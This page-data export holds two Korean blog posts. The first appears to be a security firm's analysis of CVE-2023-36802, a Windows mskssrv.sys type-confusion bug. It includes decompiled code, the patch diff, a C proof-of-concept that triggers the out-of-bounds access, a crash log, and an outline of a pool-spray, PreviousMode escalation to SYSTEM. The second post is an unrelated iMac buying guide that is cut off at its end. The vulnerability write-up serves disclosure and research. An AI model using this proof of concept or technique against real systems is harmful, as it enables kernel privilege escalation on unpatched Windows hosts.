{"pageProps":{"posts":[{"title":"N일 연속하여 모든 것을 탈취하는 방법 파트 6 - Windows 커널 LPE SYSTEM 얻기","description":"","date":"2024-05-23 15:21","slug":"2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM","content":"\n\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png)\n\n이 블로그 포스트는 저희가 X에서 시연한 1-day 풀 체인 익스플로잇에서 사용된 취약성에 대한 마지막 시리즈입니다. 이 블로그 포스트에서는 VMware의 제한된 권한에서 호스트 컴퓨터의 모든 권한을 얻기 위해 SYSTEM으로 권한 상승하는 방법을 소개할 것입니다. 취약성은 mskssrv.sys 드라이버에서 발생하는 CVE-2023-36802이며, 이는 이번 시리즈의 세 번째 블로그에서 다룬 CVE-2023-29360의 동일한 대상입니다.\n\n이 취약성은 실제로 악용되었으며 여러 위협 인텔리전스 그룹에 의해 감지되었습니다. IBM X-Force의 분석 보고서가 발표되었고 chompie1337의 PoC 코드가 10월에 공개된 가운데, 우리의 위협 인텔리전스 서비스인 Fermium-252는 이 취약성의 PoC와 익스플로잇을 모두 2023년 9월부터 보유하고 있습니다.\n\n# 세 번째 블로그를 상기해 보세요\n\n<div class=\"content-ad\"></div>\n\n이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.\n\n세 번째 블로그에 설명된 대로, 사용자는 IoControlCode가 0x2F0408일 때 FSRendezvousServer::PublishTx에 접근할 수 있습니다. 이 함수는 다음과 같습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::PublishTx(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  /**\n    입력 버퍼 유효성 검사\n  **/\n\n  FsContext2 = (const struct FSRegObject *)obj->FileObject->FsContext2;\n  // \"FsContext2\"를 FSRendezvousServer 개체 안에서 찾음\n  isfindobj = FSRendezvousServer::FindObject(this, FsContext2);\n  KeReleaseMutex((PRKMUTEX)((char *)this + 8), 0);\n  if (isfindobj)\n  {\n    (*(void(__fastcall **)(const struct FSRegObject *))(*(_QWORD *)FsContext2 + 0x38i64))(FsContext2); // FsStreamReg 잠금\n    // [*]. FSStreamReg::PublishTx 호출\n    result = FSStreamReg::PublishTx(FsContext2, data);\n```\n\n사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nFsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeStream(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  // 버퍼 할당\n  buffer = (FSStreamReg *)operator new(0x1D8ui64, (enum _POOL_TYPE)irp, 0x67657253u); // FSStreamReg의 크기는 `0x1D8`입니다\n  if ( buffer )\n    FSStreamReg_obj = (volatile signed __int32 *)FSStreamReg::FSStreamReg(buffer); // FSStreamReg 설정\n  if ( !FSStreamReg_obj )\n    return 0xC000009A;\n  // FSStreamReg 초기화\n  if ( (unsigned int)Feature_Servicing_TeamsUsingMediaFoundationCrashes__private_IsEnabled() )\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, irp, v11, data, irp->RequestorMode);\n  else\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, v10, data, irp->RequestorMode);\n\n  ...\n  // FSStreamReg_obj를 FsContext2에 저장\n  obj->FileObject->FsContext2 = (PVOID)FSStreamReg_obj;\n  _InterlockedIncrement(FSStreamReg_obj + 6);\n  ...\n```\n\n# CVE-2023–36802\n\n위에서 언급한 대로, obj-`FileObject-`FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?\n\n<div class=\"content-ad\"></div>\n\nFSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.\n\n```js\nchar __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if ( FsContext2 )\n  {\n    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 ) \n    {\n      // Type number가 `1`인 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type1RegObj = *(_QWORD **)(this + 0x90);\n        if ( !Type1RegObj || (_QWORD *)*Type1ListHead == Type1ListHead || Type1RegObj == Type1ListHead )\n          break;\n        if ( Type1RegObj != (_QWORD *)8 && Type1RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x70));\n      }\n    }\n    else \n    {\n      // Type number가 `1`이 아닌 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type2RegObj = *(_QWORD **)(this + 0x60);\n        if ( !Type2RegObj || (_QWORD *)*Type2ListHead == Type2ListHead || Type2RegObj == Type2ListHead )\n          break;\n        if ( Type2RegObj != (_QWORD *)8 && Type2RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x40));\n      }\n    }\n  }\n  return 0;\n}\n```\n\nFSRendezvousServer::FindObject는 FsContext2의 0x30 오프셋에 위치한 타입 번호에 따라 두 가지 종류의 객체가 있다는 것을 명시적으로 보여줍니다. FSStreamReg::FSStreamReg에서 FSStreamReg 타입의 생성자로부터, FSStreamReg의 타입 번호를 2로 알 수 있습니다.\n\n```js\n__int64 __fastcall FSStreamReg::FSStreamReg(__int64 FSStreamReg)\n{\n  ...\n  *(_QWORD *)FSStreamReg = &FSStreamReg::`vftable';\n  *(_QWORD *)(FSStreamReg + 0x20) = FSStreamReg;\n  *(_DWORD *)(FSStreamReg + 0x30) = 2;        // 타입 == 2\n  *(_DWORD *)(FSStreamReg + 0x34) = 0x1D8;    // 크기 == 0x1D8\n  ...\n  return FSStreamReg;\n}\n```\n\n<div class=\"content-ad\"></div>\n\nmskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeContext(FSRendezvousServer *this, struct _IRP *a2)\n{\n  ...\n  FSContextReg = (__int64)operator new(0x78ui64, (enum _POOL_TYPE)a2, 0x67657243u);\n  if ( FSContextReg )\n  {\n    ...\n    *(_QWORD *)FSContextReg = &FSContextReg::`vftable'; // VTable 설정\n    *(_QWORD *)(FSContextReg + 0x20) = FSContextReg;\n    *(_DWORD *)(FSContextReg + 0x30) = 1;    // Type == 1\n    *(_DWORD *)(FSContextReg + 0x34) = 0x78; // Size == 0x78\n    ...\n  }\n  ...\n  obj->FileObject->FsContext2 = (PVOID)FSContextReg;\n  ...\n}\n```\n\nFSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0x1D8바이트) FSContextReg가 FSStreamReg를 상속받지 않는다는 것을 알 수 있습니다. 자식 클래스는 부모 클래스의 모든 필드를 상속받기 때문에, 자식 클래스는 동일하거나 더 큰 크기를 가져야 합니다. 또한, FSRendezvousServer::FindObject 이후 추가 유효성 검사 루틴이 있으며, FSContextReg는 FSStreamReg::PublishTx의 첫 번째 인수로 사용될 수 있습니다. 따라서, 타입 혼란 취약점이 발생합니다.\n\n타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n__int64 __fastcall FSStreamReg::PublishTx(__int64 FsStreamReg, __int64 data)\n{\n  //\n  result = FSStreamReg::CheckRecycle(FsStreamReg, data);\n  ...\n  // 경계를 벗어난 접근\n  kEvent = *(struct _KEVENT **)(FsStreamReg + 0x130);\n  if (kEvent)\n  {\n    KeSetEvent(kEvent, 0, 0);\n    FSFrameMdlobj = 0i64;\nLABEL_21:\n    if (FSFrameMdlobj)\n    {\n      FSFrameMdl::~FSFrameMdl(FSFrameMdlobj);\n      operator delete(FSFrameMdlobj);\n    }\n  }\n  ...\n}\n\n__int64 __fastcall FSStreamReg::CheckRecycle(__int64 this, __int64 data)\n{\n  if (data)\n  {\n    value1 = *(_DWORD *)(data + 0x24);\n    if (value1)\n    {\n      ...\n      // 경계를 벗어난 접근\n      v12 = *(_QWORD *)(this + 0x1B0);\n      v13 = v5 + *(_DWORD *)(this + 0x1BC);\n      v14 = *(int *)(this + 0x1B8);\n  ...\n}\n```\n\n두 객체 간 사이즈 차이로 인해 형태 혼란이 발생하여 경계를 벗어난 접근 취약점이 발생합니다. 공격자는 이러한 기본적인 취약점을 활용하여 메모리 레이아웃을 조작하여 시스템 권한을 획들할 수 있습니다.\n\n# CVE-2023–36802의 패치\n\n```js\n-char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n+char __fastcall FSRendezvousServer::FindStreamObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if (FsContext2)\n  {\n-    if (*(_DWORD *)(FsContext2 + 0x30) == 1) // 유형 1 확인\n-    {\n-      FsContextList = (_QWORD *)((char *)this + 0x80);\n-      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n-    }\n-    else\n+    if (*(_DWORD *)(FsContext2 + 0x30) == 2) // 유형 2 확인\n    {\n      FsStreamList = (_QWORD *)((char *)this + 80);\n      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n    }\n  }\n  return 0;\n}\n```\n\n<div class=\"content-ad\"></div>\n\nFSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.\n\n# 취약점 발생\n\n이 취약점을 발생시키기 위해서는 FSContextReg 오브젝트를 만들어야 합니다. 이 오브젝트는 FSRendezvousServer::InitializeContext에서 생성할 수 있으며, 이 함수는 IoControlCode가 0x2F0400일 때 호출됩니다.\n\n```js\n__int64 __fastcall FSInitializeContextRendezvous(struct _IRP *a1)\n{\n  ...\n  RendezvousServerObj = operator new(0xA0ui64, v3, 0x73767A52u);\n  if(RendezvousServerObj){\n    // RendezvousServerObj 초기화\n  }\n  ServerObj_1C0005048 = RendezvousServerObj_;\n  ...\n  // `FSRendezvousServer::InitializeContext`에서 FSContextReg 오브젝트 생성\n  result = FSRendezvousServer::InitializeContext(RendezvousServerObj, a1);\n  FSRendezvousServer::Release(RendezvousServerObj);\n  return result;\n}\n```\n\n<div class=\"content-ad\"></div>\n\n그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.\n\n아래 PoC는 FSStreamReg::PublishRx를 트리거하는 데 사용됩니다.\n\n```js\n#define inputsize 0x100\n#define outputsize 0x100\nint wmain(int argc, wchar_t** argv) {\n  WCHAR DeviceLink[256] = L\"\\\\\\\\?\\\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}\";\n  HANDLE hDevice = NULL;\n  NTSTATUS ntstatus = 0;\n  hDevice = CreateFile(\n    DeviceLink,\n    GENERIC_READ | GENERIC_WRITE,\n    0,\n    NULL,\n    OPEN_EXISTING,\n    0x80,\n    NULL\n  );\n  \n  PCHAR inputBuffer = (PCHAR)malloc(inputsize);\n  PCHAR outputBuffer = (PCHAR)malloc(outputsize);\n  \n  printf(\"[+] Initialize Rendezvous\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x00) = 0xffffffff; // &1 == Non ZERO\n  *(DWORD64*)(inputBuffer + 0x08) = GetCurrentProcessId(); // Current Process ID\n  *(DWORD64*)(inputBuffer + 0x10) = 0x4343434344444444; // Some Marker\n  *(DWORD64*)(inputBuffer + 0x18) = 0; // 0\n  ntstatus = DeviceIoControl(hDevice, 0x2F0400, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // FSInitializeContextRendezvous\n  \n  printf(\"[+] Publish RX --> Trigger OOB Access Vulnerability\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x20) = 1; // maxCnt\n  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt \n  *(DWORD64*)(inputBuffer + 0x30) = 0; // Some Value\n  ntstatus = DeviceIoControl(hDevice, 0x2F040C, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // PublishRx\n}\n```\n\nmskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n1: kd> r\nrax=ffffd5019f2d1668 rbx=0000000000000000 rcx=ffffbf8b77206f80\nrdx=ffffbf8b76e02b00 rsi=ffffbf8b77206f80 rdi=0000000000000000\nrip=fffff80ffac9c9f7 rsp=ffffd5019f2d1610 rbp=ffffbf8b77045e78\n r8=0000000000000001  r9=0000000000000001 r10=0000000000000000\nr11=ffffffffffffffff r12=0000000000000000 r13=ffffbf8b76d60cd0\nr14=ffffbf8b77207108 r15=ffffbf8b76e02b00\niopl=0         nv up ei pl nz na pe nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202\nMSKSSRV!FSStreamReg::PublishRx+0x43:\nfffff80f`fac9c9f7 4d3936          cmp     qword ptr [r14],r14 ds:002b:ffffbf8b`77207108=????????????????\n\n1: kd> dq @rcx L18\nffffbf8b`77206f80  fffff80f`fac941b8 ffffbf8b`77204fe0\nffffbf8b`77206f90  ffffbf8b`77204fe0 00000000`00000002\nffffbf8b`77206fa0  ffffbf8b`77206f80 00000000`00000001\nffffbf8b`77206fb0  00000078`00000001 ffffbf8b`7681f300\nffffbf8b`77206fc0  00000000`00000000 ffffbf8b`77204fd0\nffffbf8b`77206fd0  00000000`00000001 00000000`00001b80\nffffbf8b`77206fe0  43434343`44444444 00000000`00000000\nffffbf8b`77206ff0  00000000`00000000 b3b3b3b3`b3b3b3b3\nffffbf8b`77207000  ????????`???????? ????????`????????\nffffbf8b`77207010  ????????`???????? ????????`????????\nffffbf8b`77207020  ????????`???????? ????????`????????\nffffbf8b`77207030  ????????`???????? ????????`????????\n\n1: kd> pr\nKDTARGET: Refreshing KD connection\n\n*** Fatal System Error: 0x00000050\n                       (0xFFFFBF8B77207108,0x0000000000000000,0xFFFFF80FFAC9C9F7,0x0000000000000002)\n\nDriver at fault: \n***   MSKSSRV.sys - Address FFFFF80FFAC9C9F7 base at FFFFF80FFAC90000, DateStamp 75a6d2bb\n.\n\nA fatal system error has occurred.\nDebugger entered on first try; Bugcheck callbacks have not been invoked.\n\nA fatal system error has occurred.\n\nrax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003\nrdx=0000000000000070 rsi=0000000000000000 rdi=ffffd70001988180\nrip=fffff800470171e0 rsp=ffffd5019f2d0a28 rbp=ffffd5019f2d0b90\n r8=0000000000000065  r9=0000000000000000 r10=0000000000000000\nr11=0000000000000010 r12=0000000000000003 r13=ffffbf8b77207108\nr14=000000\n```\n\n<div class=\"content-ad\"></div>\n\nFSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다. \n\n그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.\n\n메모리 레이아웃이 네임드 파이프 객체에 의해 조작되면, 아래와 같이 됩니다.\n\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png)\n\n<div class=\"content-ad\"></div>\n\n위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.\n\n```js\nNTSTATUS __stdcall NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength)\n{\n  ...\n  switch (ThreadInformationClass)\n    ...\n    case ThreadNameInformation:\n      if (ThreadInformationLength == 16)\n      {\n        result = ObReferenceObjectByHandleWithTag(ThreadHandle, 0x400u, (POBJECT_TYPE)PsThreadType, prev_mode, 0x79517350u, &ThreadObj, 0i64);\n        ...\n        // 사용자 주소 유효성 검사 ~~~\n        *(UNICODE_STRING *)ThreadName_Unicode = *(UNICODE_STRING *)ThreadInformation;\n        ...\n        // [1]. 임의 크기의 Non-Paged Pool 할당\n        NameMem = (char *)ExAllocatePoolWithTag(NonPagedPoolNx, ThreadName_Unicode.Length + 16i64, 0x6D4E6854u);\n        ThreadName = (_UNICODE_STRING *)NameMem;\n        if (ThreadName)\n        {\n          // [2]. 사용자 데이터 시작 위치 +0x10\n          NameArea = (wchar_t *)(NameMem + 0x10);\n          ThreadName->Buffer = NameArea;\n          ThreadName->Length = ThreadName_Unicode.Length;\n          ThreadName->MaximumLength = ThreadName_Unicode.Length;\n          // 사용자 데이터를 메모리로 복사\n          memmove(NameArea, ThreadName_Unicode.Buffer, ThreadName_Unicode.Length);\n          ...\n          OldName = ThreadObj->ThreadName;\n          ThreadObj->ThreadName = ThreadName;\n          ...\n          // 이전 이름의 메모리를 해제합니다.\n          if (OldName)\n            ExFreePoolWithTag(OldName, 0x6D4E6854u);\n          ...\n        }\n      }\n  ...\n}\n```\n\nThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread 시스템 호출을 통해 설정할 수 있습니다. 이 개체는 원하는 크기로 NonPagedPool에 할당되며, 이 개체의 데이터는 처음 0x10바이트를 제외하고 완전히 제어 가능합니다 ([2]). 게다가, ThreadName 개체를 해제하는 코드도 있어서 홀을 만드는 데 유용합니다 ([8]).\n\n<img src=\"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png\" />\n\n<div class=\"content-ad\"></div>\n\n이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.\n\nFermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 익스플로잇 코드를 비롯한 자세한 정보가 있습니다. Fermium-252 서비스에 관심이 있다면 contacts@theori.io로 문의하십시오.\n\n# 결론\n\n이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.\n\n<div class=\"content-ad\"></div>\n\n# 참고 자료\n\n- [chompie1337의 GitHub 페이지](https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802)\n- [Nero22k의 GitHub 페이지](https://github.com/Nero22k/cve-2023-36802)\n- [보안 인텔리전스 기사](https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/)\n- [Microsoft 보안 업데이트 - CVE-2023-36802](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-36802)\n- [Google Project Zero의 보고서](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html)\n\n🔵 웹사이트: [theori.io](https://theori.io) ✉️ 이메일: vr@theori.io","ogImage":{"url":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png"},"coverImage":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png","tag":["Tech"],"readingTime":16},{"title":"드디어 새로운 iMac이 출시되었습니다 여러분의 iMac을 구매하는 방법을 안내해드립니다","description":"","date":"2024-05-23 15:19","slug":"2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours","content":"\n\n<img src=\"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png\" />\n\n오랜만에 업데이트 없이 지내온 애플의 사랑받는 올인원 데스크탑 맥에 새로운 24인치 iMac이 드디어 출시되었습니다.\n\n\"새로운\"이라고 말씀을 드렸는데, 정확히 말하면 \"업그레이드\" 된 제품입니다.\n\n이는 2021년 5월에 출시된 24인치 iMac과 동일한 샤시, 디스플레이 및 포트 상황을 갖추고 있습니다. 다만 이제는 내부에 M3 칩이 들어가 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n애플의 이 새로운 칩은 3나노미터 공정을 기반으로 하여 원래 M1 칩보다 상당한 성능 향상을 제공합니다. 성능 코어는 최대 30% 빨라졌으며, 빠른 신경 엔진이 탑재되었고 GPU는 다른 차원입니다.\n\n하지만 24인치 iMac 중 어떤 버전이 당신에게 적합할까요? 기본 모델인 M3 iMac을 구매해야 할까요, 아니면 사양을 추가해야 할까요? 또한, 애플에 의해 후속 제품으로 대체되고 중단된 지금은 M1 iMac을 저렴한 가격에 구매하는 것이 좋을까요?\n\n이제 알아보겠습니다!\n\n## M1 또는 M3 24인치 iMac?\n\n<div class=\"content-ad\"></div>\n\neBay를 짧게 뒤져 보니, £1,000/$1,000 미만에 괜찮은 사양의 중고 24인치 M1 iMac을 구할 수 있다는 것을 알았어요. 하지만 어느 정도 좋은 제품을 찾기 위해 노력해야 합니다.\n\n애플의 재생 제품 스토어를 이용하면 방문 시기에 따라 상당한 할인 혜택을 받을 수 있어요(저장 용량이 512GB인 기본 사양 M1 iMac의 할인액인 £390이 가장 좋은 예시로 보여졌어요).\n\n아마존은 현재 24인치 M1 iMac의 재고가 줄어들고 있는 상황에서 크게 할인해 주지는 않겠지만, M3 iMac이 시판되면 그 후 몇 주 동안 주목하는 것을 추천합니다.\n\n제 경험상, 거의 2년 반된 iMac을 새로운 M3 변형 버전보다 선택하는 것을 정당화할 만한 절약된 가격이 아직은 없어요. 절대적인 깨진 제품을 찾거나 새 iMac이 할 수 있는 범위를 넘어서는 것이 필요하지 않다면요. 일반 관리, 웹 사용, 글쓰기, 가끔 창작 프로젝트에 관여하는 등의 용도라면, M1 플랫폼은 여전히 탁월한 선택이에요.\n\n<div class=\"content-ad\"></div>\n\n정직하게 말하자면 - 당신은 M3 iMac에 흥미가 많아서 이것을 읽고 있는 거 아니에요?\n\n## M3 iMac: 어떤 칩 구성이 좋을까요?\n\n만약 24인치 iMac을 구매하려고 생각 중이라면, 운이 좋다고 생각하세요. 이 Mac을 위한 칩 구성은 M3 MacBook Pro나 M2 Mac mini에 비해 훨씬 쉽게 탐색할 수 있어요.\n\n기본 모델인 M3 iMac은 8코어 CPU와 8코어 GPU가 탑재돼 있어요. 이것은 £1,399/$1,299에 구매할 수 있으며, 집이나 사무실에서 유용하게 사용할 일반적인 업무용 iMac으로 충분한 성능을 제공할 거에요. 비디오 편집이나 그래픽 집중 작업에 자주 뛰어들 계획이 없다면 더 강력한 것은 필요하지 않아요.\n\n<div class=\"content-ad\"></div>\n\n원하는 경우 더 많은 금액을 지출하고 싶으시다면 다른 칩 구성이 하나 더 있습니다. 동일한 8코어 CPU를 갖고 있지만, 10코어 GPU로 인해 그래픽 성능이 향상됩니다. 이것은 추가로 £200/$200이 드는데, 이 구성을 위해 따로 업그레이드 받는 유일한 것은 GPU 코어 2개 뿐이라는 점을 중요하게 알아두시기 바랍니다. 이 구성은 동일한 8GB 통합 메모리와 256GB 저장 공간을 갖고 있습니다.\n\n내 의견으로는 이 추가된 GPU 코어 2개는 정말 선택해야 할 가치가 없고, 그래픽 집중적인 작업을 진정으로 많이 하지 않는 이상 그 존재를 느낄 수 있을지도 모릅니다.\n\n저는 24인치 M3 iMac에 할당된 추가 금액을 다른 곳에 쓰시는 것이 더 좋다고 생각합니다. 그러면 나머지 구성 옵션에 대해 이야기해 보겠습니다.\n\n## M3 iMac: 통합 메모리 얼마나 필요한가요?\n\n<div class=\"content-ad\"></div>\n\nM3 iMac은 통합 메모리에 대해 세 가지 옵션이 있습니다. 이는 이전의 M1 버전의 16GB 한계를 능가하는 중요한 업그레이드입니다. M3 iMac은 최대 24GB의 통합 메모리로 구성할 수 있습니다.\n\n베이스 모델의 8GB는 생각보다 훨씬 더 많은 것을 할 수 있습니다. 이 기기가 일반 가정 및 사무 업무에서 역할을 할 예정이라면 정말 더 이상 필요하지 않습니다.\n\n투자 가치를 극대화하고 장기적인 사용을 고려하는 사람을 위해, £200/$200을 지불하여 16GB의 통합 메모리를 얻는 것이 현명한 선택일 것입니다. 두 개의 GPU 코어에 동일한 가격을 쓰는 것보다 훨씬 현명한 선택일 것입니다.\n\n24GB에 대해 어떻게 생각하시나요? 만약 그만큼의 메모리가 필요하다는 것을 알고 계신다면, 그만큼의 메모리가 필요한 거죠. 대규모 데이터 집합을 작업하거나 많은 플러그인과 샘플 라이브러리를 사용하여 음악을 제작하는 사람들은 가능한 한 많은 메모리를 원할 것이며, £400/$400 업그레이드는 가치가 있을 것입니다.\n\n<div class=\"content-ad\"></div>\n\n## M3 iMac: 저장 용량은 얼마인가요?\n\n아이맥은 내장 저장 공간에 너무 많은 돈을 쓸 필요가 거의 없는 맥북이에요. 특히 애플의 SSD 가격을 고려할 때 더욱 그렇습니다.\n\n예를 들어, M3 iMac의 256GB 기본 저장 용량을 512GB로 두 배로 늘리고 싶다면 추가로 $200/£200을 내야 합니다. 비교해보면, 1TB 저장 용량을 가진 삼성 T7 외장 SSD는 약 £80 정도에 구입할 수 있어요. 2TB를 원하시나요? 해당 삼성 T7 버전은 여전히 애플의 제공 제품보다 훨씬 싸구요 (게다가 아이맥은 내장 저장 용량이 1TB를 넘지 않아요).\n\nM3 iMac에 설치된 로컬 앱에 좀 더 여유 공간을 제공하기 위해 512GB 업그레이드를 하는 것은 합리적일 수 있지만, 추가 저장 용량이 필요하다면 언제나 타사 외장 SSD를 구매하는 것을 추천해요. 하더라도 그것들은 더 저렴하고, 크며, 무한히 확장 가능해요. 게다가 빛나는 새로운 iMac 뒤쪽에 깔끔하게 넣어두면 거기 없는 줄 알 거예요.\n\n<div class=\"content-ad\"></div>\n\n## M3 iMac: 포트와 주변장치\n\n기본 모델 iMac은 두 개의 썬더볼트/USB 4 포트가 포함되어 있습니다. 그 이상을 얻는 유일한 방법은 다음 모델로 업그레이드하는 것인데, 해당 모델은 추가적으로 두 개의 USB 3 포트와 기가비트 이더넷이 전원 공급 장치에 내장되어 있습니다. 후자는 기본 모델에 추가 비용 £30/$30에 설치할 수 있습니다.\n\n주잡기로는 모든 모델에 매직 마우스와 매직 키보드가 포함되어 있습니다. 그러나, 기본 모델의 키보드에는 터치 ID가 포함되어 있지 않습니다. 터치 ID는 상위 구성 단계에서 표준으로 제공됩니다. 만약 기본 모델 M3 iMac에서 터치 ID를 원한다면 추가로 £50/$50을 지불해야 합니다.\n\n네덜란드 키보드는 iMac 선택에 따라 추가 비용이 £30/$30에서 £80/$80까지 발생할 수 있으며, 만약 마우스 대신 트랙패드를 좋아한다면 (강력히 추천드립니다), 해당 비용은 £50/$50이 소요됩니다.\n\n<div class=\"content-ad\"></div>\n\n내 조언은요? Apple Watch가 있으면 Touch ID를 신경 쓰지 않아도 돼요 (맥을 잠금 해제하는 데 불필요하게 만들어요), 하지만 정말이지 Magic Mouse를 Magic Trackpad로 교체해보세요!\n\n## 결론: 어떤 M3 iMac이 당신에게 적합한가요?\n\n이 구매 가이드가 유용했다면 좋겠네요. 앞서 언급했듯이, 24인치 M3 iMac은 업그레이드 가능한 구성 요소와 구성이 상대적으로 적어 구매하기 쉬운 편이에요.\n\n요약하자면, 심하게 그래픽 집중적인 작업을 하지 않는 한, 기본 M3 칩을 그대로 두고 통합 메모리와 저장 공간 업그레이드에 예산을 집중하세요 (하지만 후자에 좀 지나치게 들어가지는 마세요!).\n\n<div class=\"content-ad\"></div>\n\n어떤 M1 iMac을 선택하셨나요? 어떤 용도로 사용할 건가요? 아래에서 의견을 공유해주세요!\n\n## 떠나시기 전에\n\n수익을 창출하고 행복한 온라인 크리에이터가 되는 팁을 얻으려면 제 Substack 뉴스레터에 가입해주세요! 이 게시물에는 제휴 링크가 포함되어 있습니다.\n\n원문은 2023년 11월 1일에 https://markellisreviews.com에서 